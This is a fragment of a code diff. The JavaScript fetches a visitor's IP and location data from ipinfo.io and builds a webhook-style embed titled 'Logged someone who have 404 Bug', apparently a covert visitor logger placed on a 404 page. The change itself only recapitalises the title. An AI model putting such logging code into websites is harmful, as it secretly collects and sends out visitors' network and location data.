@@ -2,7 +2,7 @@ $.getJSON("https://ipinfo.io/json", function(data) {
   var params = {
     embeds: [
       {
-        "title": "Logged someone who have 404 Bug",
+        "title": "Logged someone who have 404 BUG",
         "color": 12846084,
         "thumbnail": {
         },
